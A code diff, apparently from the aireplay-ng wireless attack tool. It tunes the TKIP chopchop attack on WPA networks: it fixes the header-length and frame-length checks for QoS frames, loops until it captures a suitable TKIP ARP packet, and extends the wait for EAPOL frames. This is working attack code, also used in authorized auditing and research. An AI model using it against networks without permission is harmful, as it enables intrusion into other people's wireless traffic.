@@ -2696,21 +2696,21 @@ int do_attack_tkipchop( uchar* src_packet, int src_packet_len )
         {
             /* check if it's a WEP data packet */
 
-            if( ( h80211[0] & 0x0C ) != 8 ) continue;
+            if( ( h80211[0] & 0x0C ) != 8 ) continue; //must be a data packet
             if( ( h80211[0] & 0x70 ) != 0 ) continue;
 //             if( ( h80211[1] & 0x03 ) != 2 ) continue;
             if( ( h80211[1] & 0x40 ) == 0 ) continue;
 
-            /* check the extended IV (TKIP) flag */
-
+            /* get header length right */
             z = ( ( h80211[1] & 3 ) != 3 ) ? 24 : 30;
             if ( ( h80211[0] & 0x80 ) == 0x80 ) /* QoS */
                 z+=2;
 
+            /* check the extended IV (TKIP) flag */
             if( ( h80211[z + 3] & 0x20 ) == 0 ) continue;
 
             /* check length (153)!? */
-            if( n != 153 ) continue;
+            if( z+127 != n ) continue; //(153[26+127] bytes for eapol mic failure in tkip qos frames from client to AP)
 
 //             printf("yeah!\n");
 
@@ -3696,7 +3696,7 @@ int main( int argc, char *argv[] )
     memset( &dev, 0, sizeof( dev ) );
 
     opt.f_type    = -1; opt.f_subtype   = -1;
-    opt.f_minlen  = 80; opt.f_maxlen    = 96;
+    opt.f_minlen  = 80; opt.f_maxlen    = 98;
     opt.f_tods    = -1; opt.f_fromds    = -1;
     opt.f_iswep   = -1; opt.ringbuffer  =  8;
 
@@ -4285,11 +4285,16 @@ usage:
     opt.f_tods = 1;
     opt.f_fromds = 0;
     memcpy(opt.f_smac, opt.r_smac, 6);
-//     memcpy(opt.f_dmac, opt.f_bssid, 6);
+//    memcpy(opt.f_dmac, opt.f_bssid, 6);
     opt.fast = 1;
 
-    if( capture_ask_packet( &caplen, 0 ) != 0 )
-        return( 1 );
+    while(1)
+    {
+        if( capture_ask_packet( &caplen, 0 ) != 0 )
+            return( 1 );
+        if( is_qos_arp_tkip(h80211, caplen) == 1 )
+            break;
+    }
 
     memcpy(packet2, h80211, caplen);
     packet2_len = caplen;
@@ -4306,8 +4311,13 @@ usage:
     memcpy(opt.f_smac, NULL_MAC, 6);
     opt.fast = 1;
 
-    if( capture_ask_packet( &caplen, 0 ) != 0 )
-        return( 1 );
+    while(1)
+    {
+        if( capture_ask_packet( &caplen, 0 ) != 0 )
+            return( 1 );
+        if( is_qos_arp_tkip(h80211, caplen) == 1 )
+            break;
+    }
 
     memcpy(packet1, h80211, caplen);
     packet1_len = caplen;
@@ -4315,8 +4325,8 @@ usage:
 
     PCT; printf("Got the answer!\n");
 
-    PCT; printf("Waiting 5 seconds to let encrypted EAPOL frames pass without interfering.\n");
-    read_sleep(5*1000000);
+    PCT; printf("Waiting 10 seconds to let encrypted EAPOL frames pass without interfering.\n");
+    read_sleep(10*1000000);
 
     memcpy(h80211, packet1, packet1_len);
 
